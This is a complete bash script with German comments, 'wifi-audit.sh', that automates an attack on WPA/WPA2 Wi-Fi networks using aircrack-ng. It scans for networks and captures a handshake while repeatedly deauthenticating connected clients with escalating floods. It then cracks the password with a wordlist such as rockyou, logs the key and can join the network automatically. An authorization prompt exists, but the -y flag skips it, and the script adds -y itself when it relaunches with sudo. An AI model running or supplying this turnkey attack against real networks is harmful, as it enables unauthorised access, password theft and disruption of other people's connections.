#!/usr/bin/env bash
#
# wifi-audit.sh — autonomer WPA/WPA2-Audit  (aircrack-ng)
# ======================================================
# Autorisierter Einsatz nur! Teste ausschliesslich Netzwerke, die dir
# gehoeren oder fuer die du eine schriftliche Erlaubnis besitzt.
#
# Idee:  starten  ->  (Interface nur falls noetig)  ->  Netz waehlen
#        ->  Angriff laeuft von selbst  ->  warten  ->  Ergebnis.
#
# Nach der Zielwahl KEINE weiteren Fragen. Der Handshake-Angriff eskaliert
# den Deauth automatisch (gezielt gegen erkannte Clients + Broadcast) und
# wartet in Runden, bis der Handshake sitzt; danach wird sofort gecrackt.
#
# Voll ohne Rueckfrage:
#   sudo ./wifi-audit.sh -b AA:BB:CC:11:22:33   # Kanal wird selbst gesucht
#
# ---------------------------------------------------------------------------

set -o pipefail   # bewusst KEIN 'set -e' (Tools liefern legitim Code != 0)

# --------------------------------------------------------------------------- #
#  Optik                                                                       #
# --------------------------------------------------------------------------- #
if [ -t 1 ]; then
    R=$'\e[0m'; B=$'\e[1m'; DIM=$'\e[2m'
    RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'
    BLU=$'\e[34m'; CYA=$'\e[36m'; MAG=$'\e[35m'
else
    R=; B=; DIM=; RED=; GRN=; YEL=; BLU=; CYA=; MAG=
fi
info() { printf '%s[*]%s %s\n' "$CYA" "$R" "$*"; }
ok()   { printf '%s[+]%s %s\n' "$GRN" "$R" "$*"; }
warn() { printf '%s[!]%s %s\n' "$YEL" "$R" "$*"; }
err()  { printf '%s[x]%s %s\n' "$RED" "$R" "$*" >&2; }
step() { printf '\n%s%s==>%s %s%s%s\n' "$B" "$BLU" "$R" "$B" "$*" "$R"; }

banner() {
    printf '%s' "$CYA"
    cat <<'EOF'
   ┌───────────────────────────────────────────────┐
   │            W I F I  ·  A U D I T               │
   │     autonomer WPA / WPA2 Handshake-Crack       │
   └───────────────────────────────────────────────┘
EOF
    printf '%s' "$R"
}

have() { command -v "$1" >/dev/null 2>&1; }

# --------------------------------------------------------------------------- #
#  CLI                                                                         #
# --------------------------------------------------------------------------- #
IFACE=""; MON=""; BSSID=""; CH=""; ESSID=""; ENC=""
WORDLIST=""
SCAN_TIME=15
CAP_TIME=180          # Gesamt-Budget fuer den Handshake-Angriff (Sekunden)
ASSUME_YES=0
DO_CONNECT=0
AUTO_AP=0             # 1 = bei mehreren APs eines Netzes ohne Rueckfrage staerksten nehmen

usage() {
    cat <<EOF
${B}wifi-audit.sh${R} — autonomer WPA/WPA2-Audit

  -i, --iface <dev>      WLAN-Interface (sonst automatisch)
  -w, --wordlist <file>  Wortliste (Standard: rockyou.txt, auto-entpackt)
  -b, --bssid <mac>      Ziel-BSSID (Scan/Auswahl entfaellt; Kanal wird gesucht)
  -c, --channel <n>      Ziel-Kanal (optional zu -b)
  -e, --essid <name>     Ziel-Name (optional zu -b)
  -s, --scan-time <s>    Scan-Dauer (Standard ${SCAN_TIME}s)
  -T, --cap-time <s>     Handshake-Budget (Standard ${CAP_TIME}s)
  -C, --connect          Bei Erfolg automatisch verbinden (nmcli)
  -a, --auto             Bei mehreren APs eines Netzes ohne Frage staerksten nehmen
  -y, --yes              Ohne Autorisierungs-Nachfrage starten
  -h, --help             Diese Hilfe

Netze mit mehreren Accesspoints/Baendern (gleiche SSID) werden zu EINEM
Eintrag zusammengefasst; standardmaessig wird der staerkste AP angegriffen.
Bei mehreren APs kannst du optional einen bestimmten waehlen (mit -a nicht).
EOF
}

while [ $# -gt 0 ]; do
    case "$1" in
        -i|--iface)     IFACE="$2"; shift 2;;
        -w|--wordlist)  WORDLIST="$2"; shift 2;;
        -b|--bssid)     BSSID="$2"; shift 2;;
        -c|--channel)   CH="$2"; shift 2;;
        -e|--essid)     ESSID="$2"; shift 2;;
        -s|--scan-time) SCAN_TIME="$2"; shift 2;;
        -T|--cap-time)  CAP_TIME="$2"; shift 2;;
        -C|--connect)   DO_CONNECT=1; shift;;
        -a|--auto)      AUTO_AP=1; shift;;
        -y|--yes)       ASSUME_YES=1; shift;;
        -h|--help)      usage; exit 0;;
        *) err "Unbekannte Option: $1"; usage; exit 1;;
    esac
done

# --------------------------------------------------------------------------- #
#  Aufraeumen (immer)                                                          #
# --------------------------------------------------------------------------- #
NM_STOPPED=0; WORKDIR=""; SCAN_PID=""; CAP_PID=""
cleanup() {
    trap - EXIT INT TERM
    printf '\r\033[K'
    [ -n "$SCAN_PID" ] && kill "$SCAN_PID" 2>/dev/null
    [ -n "$CAP_PID"  ] && kill "$CAP_PID"  2>/dev/null
    if [ -n "$MON" ]; then
        airmon-ng stop "$MON" >/dev/null 2>&1
    fi
    if [ "$NM_STOPPED" -eq 1 ]; then
        systemctl restart NetworkManager >/dev/null 2>&1 \
            || service network-manager restart >/dev/null 2>&1 || true
    fi
    [ -n "$WORKDIR" ] && rm -rf "$WORKDIR" 2>/dev/null
}
trap cleanup EXIT INT TERM

# --------------------------------------------------------------------------- #
#  1) Autorisierung  (einmaliger Start-OK, mit -y uebersprungen)               #
# --------------------------------------------------------------------------- #
banner
if [ "$ASSUME_YES" -ne 1 ]; then
    printf '%s%s  Nur autorisierte Netzwerke testen (eigene / mit Erlaubnis).%s\n' "$YEL" "$B" "$R"
    printf '  Starten? %s[j/N]%s ' "$DIM" "$R"
    read -r ans
    case "$ans" in j|J|y|Y|ja|Ja|yes) ;; *) err "Abgebrochen."; exit 1;; esac
fi

# --------------------------------------------------------------------------- #
#  2) Root  (auto re-exec)                                                     #
# --------------------------------------------------------------------------- #
if [ "$(id -u)" -ne 0 ]; then
    if have sudo; then
        info "Root benoetigt — starte mit sudo neu ..."
        exec sudo -E -- "$0" "$@" -y
    fi
    err "Bitte als root ausfuehren."; exit 1
fi

# --------------------------------------------------------------------------- #
#  3) Werkzeuge                                                                #
# --------------------------------------------------------------------------- #
step "Werkzeuge pruefen"
CORE=(iw airmon-ng airodump-ng aireplay-ng aircrack-ng)
missing=(); for t in "${CORE[@]}"; do have "$t" || missing+=("$t"); done
if [ "${#missing[@]}" -gt 0 ]; then
    warn "Fehlt: ${missing[*]} — installiere ..."
    if have apt-get; then
        apt-get update -qq >/dev/null 2>&1
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq aircrack-ng iw >/dev/null 2>&1
    fi
    still=(); for t in "${CORE[@]}"; do have "$t" || still+=("$t"); done
    [ "${#still[@]}" -gt 0 ] && { err "Konnte nicht installieren: ${still[*]}"; exit 1; }
fi
ok "Kernwerkzeuge vorhanden."
WORKDIR="$(mktemp -d /tmp/wifi-audit.XXXXXX)"

# --------------------------------------------------------------------------- #
#  4) Interface  (nur fragen, wenn wirklich mehrdeutig)                        #
# --------------------------------------------------------------------------- #
step "WLAN-Interface"
mapfile -t IFACES < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
if [ -z "$IFACE" ]; then
    if   [ "${#IFACES[@]}" -eq 0 ]; then err "Kein WLAN-Interface gefunden."; exit 1
    elif [ "${#IFACES[@]}" -eq 1 ]; then IFACE="${IFACES[0]}"
    else
        info "Mehrere Interfaces:"
        for n in "${!IFACES[@]}"; do printf '   %s%s)%s %s\n' "$CYA" "$((n+1))" "$R" "${IFACES[$n]}"; done
        printf '  Auswahl %s[Enter=1]:%s ' "$DIM" "$R"; read -r sel
        IFACE="${IFACES[$(( ${sel:-1} - 1 ))]:-${IFACES[0]}}"
    fi
fi
ok "Interface: ${B}${IFACE}${R}"

# --------------------------------------------------------------------------- #
#  5) Monitor-Mode                                                             #
# --------------------------------------------------------------------------- #
step "Monitor-Mode aktivieren"
rfkill unblock wifi 2>/dev/null || true
if have systemctl && systemctl is-active --quiet NetworkManager 2>/dev/null; then NM_STOPPED=1; fi
airmon-ng check kill >/dev/null 2>&1
airmon-ng start "$IFACE" >/dev/null 2>&1
detect_monitor() {
    local m; m=$(iw dev 2>/dev/null | awk '/Interface/{i=$2} /type monitor/{print i; exit}')
    if [ -n "$m" ]; then echo "$m"; return; fi
    for cand in "${IFACE}mon" "${IFACE}" mon0; do
        iw dev "$cand" info >/dev/null 2>&1 && { echo "$cand"; return; }
    done
}
MON="$(detect_monitor)"
[ -z "$MON" ] && { err "Monitor-Mode fehlgeschlagen."; exit 1; }
ok "Monitor: ${B}${MON}${R}"

# --------------------------------------------------------------------------- #
#  Scan  (robust, haengt nicht)                                                #
# --------------------------------------------------------------------------- #
declare -a NET_BSSID NET_CH NET_ENC NET_PWR NET_ESSID

countdown() {
    local secs="$1" label="$2" pid="${3:-}"
    local frames='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏' i=0 end=$((SECONDS + secs))
    while [ "$SECONDS" -lt "$end" ]; do
        [ -n "$pid" ] && ! kill -0 "$pid" 2>/dev/null && break
        printf '\r  %s%s%s %s %s(%ss)%s   ' "$CYA" "${frames:i++%${#frames}:1}" "$R" \
            "$label" "$DIM" "$((end - SECONDS))" "$R"
        sleep 1
    done
    printf '\r\033[K'
}

do_scan() {
    local prefix="$WORKDIR/scan"
    rm -f "${prefix}"-*.csv 2>/dev/null
    airodump-ng --write-interval 1 --output-format csv -w "$prefix" "$MON" >/dev/null 2>&1 &
    SCAN_PID=$!
    countdown "$SCAN_TIME" "Suche Netzwerke" "$SCAN_PID"
    kill -INT "$SCAN_PID" 2>/dev/null; wait "$SCAN_PID" 2>/dev/null; SCAN_PID=""
    local csv; csv=$(ls -1t "${prefix}"-*.csv 2>/dev/null | head -n1)
    [ -f "$csv" ] || return 1
    NET_BSSID=(); NET_CH=(); NET_ENC=(); NET_PWR=(); NET_ESSID=()
    while IFS=$'\t' read -r pwr ch enc bssid essid; do
        [ -z "$bssid" ] && continue
        NET_PWR+=("$pwr"); NET_CH+=("$ch"); NET_ENC+=("$enc")
        NET_BSSID+=("$bssid"); NET_ESSID+=("$essid")
    done < <(awk -F',' '
        { gsub(/\r/,"") }
        /^Station MAC/ { exit }
        $1 ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/ && NF >= 14 {
            bssid=$1; ch=$4; enc=$6; pwr=$9; essid=""
            for (i=14; i<NF; i++) essid = essid (i>14 ? "," : "") $i
            gsub(/^ +| +$/,"",bssid); gsub(/^ +| +$/,"",ch)
            gsub(/^ +| +$/,"",enc);   gsub(/^ +| +$/,"",pwr)
            gsub(/^ +| +$/,"",essid)
            if (essid == "") essid = "<versteckt>"
            print pwr "\t" ch "\t" enc "\t" bssid "\t" essid
        }' "$csv" | sort -t$'\t' -k1,1nr)
    [ "${#NET_BSSID[@]}" -gt 0 ]
}

sig_bar() {
    local p="$1"; case "$p" in -[0-9]*|[0-9]*) ;; *) p=-100;; esac
    if   [ "$p" -ge -50 ]; then printf '%s▇▇▇▇%s' "$GRN" "$R"
    elif [ "$p" -ge -60 ]; then printf '%s▆▆▆%s%s▁%s' "$GRN" "$R" "$DIM" "$R"
    elif [ "$p" -ge -70 ]; then printf '%s▅▅%s%s▁▁%s' "$YEL" "$R" "$DIM" "$R"
    elif [ "$p" -ge -80 ]; then printf '%s▃%s%s▁▁▁%s' "$YEL" "$R" "$DIM" "$R"
    else                        printf '%s▁%s%s▁▁▁%s' "$RED" "$R" "$DIM" "$R"; fi
}
enc_tag() {
    case "$1" in
        *WPA3*) printf '%sWPA3%s' "$MAG" "$R";;
        *WPA2*) printf '%sWPA2%s' "$GRN" "$R";;
        *WPA*)  printf '%sWPA %s' "$GRN" "$R";;
        *WEP*)  printf '%sWEP %s' "$YEL" "$R";;
        *OPN*|"") printf '%sOPEN%s' "$CYA" "$R";;
        *) printf '%-4s' "$1";;
    esac
}

# --------------------------------------------------------------------------- #
#  6) Ziel bestimmen                                                           #
# --------------------------------------------------------------------------- #
if [ -n "$BSSID" ] && [ -n "$CH" ]; then
    step "Ziel (vorgegeben)"
    ok "BSSID ${B}${BSSID}${R}  Kanal ${B}${CH}${R}  ${ESSID}"
else
    step "Netzwerk-Scan"
    if ! do_scan; then
        warn "Nichts gefunden — zweiter Versuch (laenger) ..."
        SCAN_TIME=$((SCAN_TIME + 10)); do_scan || { err "Keine Netzwerke gefunden."; exit 1; }
    fi

    if [ -n "$BSSID" ]; then
        # BSSID vorgegeben, Kanal automatisch aus Scan holen -> keine Frage
        found=0
        for i in "${!NET_BSSID[@]}"; do
            if [ "${NET_BSSID[$i],,}" = "${BSSID,,}" ]; then
                CH="${NET_CH[$i]}"; ESSID="${NET_ESSID[$i]}"; ENC="${NET_ENC[$i]}"; found=1; break
            fi
        done
        [ "$found" -eq 1 ] || { err "BSSID $BSSID nicht in Reichweite."; exit 1; }
        ok "Ziel: ${B}${ESSID}${R}  (${BSSID}, Kanal ${CH})"
    else
        # Nach ESSID gruppieren: mehrere APs/Baender desselben Netzes = 1 Eintrag.
        # NET_* ist nach Signal absteigend sortiert -> erster Treffer = staerkster AP.
        declare -A _grp_of; GRP_MEMBERS=()
        for i in "${!NET_BSSID[@]}"; do
            e="${NET_ESSID[$i]}"
            if [ "$e" = "<versteckt>" ]; then           # versteckte nicht mergen
                GRP_MEMBERS+=("$i")
            elif [ -n "${_grp_of[$e]:-}" ]; then
                g="${_grp_of[$e]}"; GRP_MEMBERS[$g]="${GRP_MEMBERS[$g]} $i"
            else
                _grp_of[$e]="${#GRP_MEMBERS[@]}"; GRP_MEMBERS+=("$i")
            fi
        done

        printf '\n  %s%3s  %-8s %-5s %-4s  %-4s  %s%s\n' "$B" "#" "SIGNAL" "dBm" "KAN" "ENC" "NAME" "$R"
        printf '  %s%s%s\n' "$DIM" "────────────────────────────────────────────────────────────" "$R"
        for g in "${!GRP_MEMBERS[@]}"; do
            read -ra _m <<< "${GRP_MEMBERS[$g]}"; r="${_m[0]}"; n="${#_m[@]}"
            name="${NET_ESSID[$r]}"
            [ "$n" -gt 1 ] && name="${name} ${DIM}(${n} APs)${R}"
            printf '  %s%3s%s  %b %4s  %-4s  %s  %b\n' "$CYA" "$((g+1))" "$R" \
                "$(sig_bar "${NET_PWR[$r]}")" "${NET_PWR[$r]}" "${NET_CH[$r]}" \
                "$(enc_tag "${NET_ENC[$r]}")" "$name"
        done
        echo
        printf '  Ziel %s[Enter=1, 1-%s]:%s ' "$DIM" "${#GRP_MEMBERS[@]}" "$R"; read -r pick
        g=$(( ${pick:-1} - 1 ))
        [ -n "${GRP_MEMBERS[$g]:-}" ] || { err "Ungueltige Auswahl."; exit 1; }
        read -ra _m <<< "${GRP_MEMBERS[$g]}"; chosen="${_m[0]}"

        # Mehrere APs -> staerkster ist Standard, Auswahl optional (mit -a uebersprungen)
        if [ "${#_m[@]}" -gt 1 ] && [ "$AUTO_AP" -ne 1 ]; then
            printf '  %s"%s" hat %s APs — staerkster ist Standard:%s\n' \
                "$DIM" "${NET_ESSID[$chosen]}" "${#_m[@]}" "$R"
            for k in "${!_m[@]}"; do
                mi="${_m[$k]}"; tag=""; [ "$k" -eq 0 ] && tag=" ${GRN}← staerkster${R}"
                printf '     %s%s)%s %b %4s dBm  Kan %-3s  %s%b\n' "$CYA" "$((k+1))" "$R" \
                    "$(sig_bar "${NET_PWR[$mi]}")" "${NET_PWR[$mi]}" "${NET_CH[$mi]}" \
                    "${NET_BSSID[$mi]}" "$tag"
            done
            printf '  AP %s[Enter=1, 1-%s]:%s ' "$DIM" "${#_m[@]}" "$R"; read -r ap
            aidx=$(( ${ap:-1} - 1 ))
            [ -n "${_m[$aidx]:-}" ] && chosen="${_m[$aidx]}"
        fi

        BSSID="${NET_BSSID[$chosen]}"; CH="${NET_CH[$chosen]}"
        ESSID="${NET_ESSID[$chosen]}"; ENC="${NET_ENC[$chosen]}"
        ok "Ziel: ${B}${ESSID}${R}  (${BSSID}, Kanal ${CH})"
    fi
    printf '%s' "$ENC" | grep -q 'WPA3' && warn "WPA3: kein Offline-Handshake-Angriff moeglich."
fi

# --------------------------------------------------------------------------- #
#  7) Angriff — laeuft autonom, du wartest nur                                 #
# --------------------------------------------------------------------------- #
step "Handshake-Angriff (autonom)"
CAP_PREFIX="$WORKDIR/hs"
rm -f "${CAP_PREFIX}"-*.cap "${CAP_PREFIX}"-*.csv 2>/dev/null

got_handshake() {
    local cap="$1"; [ -n "$cap" ] && [ -f "$cap" ] || return 1
    aircrack-ng "$cap" 2>/dev/null | grep -qE '1 handshake|WPA \(1 handshake\)'
}
# Clients des Ziels aus der airodump-CSV lesen (fuer gezielten Deauth)
parse_clients() {
    awk -F',' -v bss="$BSSID" '
        { gsub(/\r/,"") }
        /^Station MAC/ { s=1; next }
        s==1 {
            mac=$1; b=$6; gsub(/^ +| +$/,"",mac); gsub(/^ +| +$/,"",b)
            if (toupper(b)==toupper(bss) && mac ~ /^[0-9A-Fa-f][0-9A-Fa-f]:/) print mac
        }' "$1"
}

airodump-ng -c "$CH" --bssid "$BSSID" -w "$CAP_PREFIX" \
    --output-format pcap,csv "$MON" >/dev/null 2>&1 &
CAP_PID=$!
sleep 3

HS=0; deauth=5; round=0; end=$((SECONDS + CAP_TIME))
info "Sammle Handshake — Deauth eskaliert automatisch. Zuruecklehnen ..."
while [ "$SECONDS" -lt "$end" ]; do
    round=$((round + 1))
    csv=$(ls -1t "${CAP_PREFIX}"-*.csv 2>/dev/null | head -n1)
    cap=$(ls -1t "${CAP_PREFIX}"-*.cap 2>/dev/null | head -n1)

    clients=(); [ -n "$csv" ] && mapfile -t clients < <(parse_clients "$csv")
    if [ "${#clients[@]}" -gt 0 ]; then
        for c in "${clients[@]}"; do
            aireplay-ng --deauth "$deauth" -a "$BSSID" -c "$c" "$MON" >/dev/null 2>&1
        done
    fi
    aireplay-ng --deauth "$deauth" -a "$BSSID" "$MON" >/dev/null 2>&1   # Broadcast

    w=0
    while [ "$w" -lt 6 ] && [ "$SECONDS" -lt "$end" ]; do
        printf '\r  %s⠿%s Runde %s · %s Client(s) · Deauth %s · %s(%ss)%s   ' \
            "$CYA" "$R" "$round" "${#clients[@]}" "$deauth" "$DIM" "$((end - SECONDS))" "$R"
        sleep 1; w=$((w + 1))
        got_handshake "$cap" && { HS=1; break; }
    done
    [ "$HS" -eq 1 ] && break
    deauth=$((deauth + 5)); [ "$deauth" -gt 30 ] && deauth=30
done
printf '\r\033[K'
kill -INT "$CAP_PID" 2>/dev/null; wait "$CAP_PID" 2>/dev/null; CAP_PID=""

CAP=$(ls -1t "${CAP_PREFIX}"-*.cap 2>/dev/null | head -n1)
[ "$HS" -eq 1 ] || { err "Kein Handshake in ${CAP_TIME}s. Naeher ran oder -T erhoehen."; exit 1; }
ok "Handshake erfasst nach ${round} Runde(n)."

# --------------------------------------------------------------------------- #
#  8) Wortliste  (auto: rockyou entpacken)                                     #
# --------------------------------------------------------------------------- #
step "Wortliste"
if [ -z "$WORDLIST" ]; then
    for c in /usr/share/wordlists/rockyou.txt /usr/share/wordlists/rockyou.txt.gz \
             /usr/share/wordlists/fern-wifi/common.txt /usr/share/dict/words; do
        [ -f "$c" ] && { WORDLIST="$c"; break; }
    done
fi
if [ "${WORDLIST##*.}" = "gz" ] && [ -f "$WORDLIST" ]; then
    info "Entpacke $(basename "$WORDLIST") ..."; gunzip -kf "$WORDLIST" 2>/dev/null
    WORDLIST="${WORDLIST%.gz}"
fi
if [ -z "$WORDLIST" ] || [ ! -f "$WORDLIST" ]; then
    printf '  Pfad zur Wortliste: '; read -r WORDLIST
fi
[ -f "$WORDLIST" ] || { err "Wortliste nicht gefunden."; exit 1; }
ok "Wortliste: ${B}${WORDLIST}${R}"

# --------------------------------------------------------------------------- #
#  9) Cracken                                                                  #
# --------------------------------------------------------------------------- #
step "Passwort cracken"
info "aircrack-ng laeuft (Abbruch: Strg-C) ..."
KEYFILE="$WORKDIR/key.txt"
aircrack-ng -q -b "$BSSID" -w "$WORDLIST" -l "$KEYFILE" "$CAP" 2>/dev/null

if [ -s "$KEYFILE" ]; then
    KEY="$(cat "$KEYFILE")"
    echo
    printf '%s%s┌──────────────────────────────────────────────┐%s\n' "$B" "$GRN" "$R"
    printf '%s%s│  PASSWORT GEFUNDEN                            │%s\n' "$B" "$GRN" "$R"
    printf '%s%s└──────────────────────────────────────────────┘%s\n' "$B" "$GRN" "$R"
    printf '   Netz:     %s%s%s\n' "$B" "${ESSID:-?}" "$R"
    printf '   BSSID:    %s\n' "$BSSID"
    printf '   Passwort: %s%s%s%s\n\n' "$B" "$GRN" "$KEY" "$R"

    # Ergebnis protokollieren (im Aufrufverzeichnis)
    { printf '%s | %s | %s | %s\n' "$(date '+%F %T')" "${ESSID:-?}" "$BSSID" "$KEY"; } \
        >> "${PWD}/wifi-audit-results.txt" 2>/dev/null \
        && info "Gespeichert in ./wifi-audit-results.txt"

    if [ "$DO_CONNECT" -eq 1 ] && [ -n "$ESSID" ] && have nmcli; then
        info "Verbinde mit ${ESSID} ..."
        airmon-ng stop "$MON" >/dev/null 2>&1; MON=""
        systemctl restart NetworkManager >/dev/null 2>&1; NM_STOPPED=0
        sleep 3
        nmcli dev wifi connect "$ESSID" password "$KEY" && ok "Verbunden." || err "Verbindung fehlgeschlagen."
    fi
    exit 0
else
    err "Passwort nicht in der Wortliste. Groessere Liste (-w) probieren."
    exit 2
fi
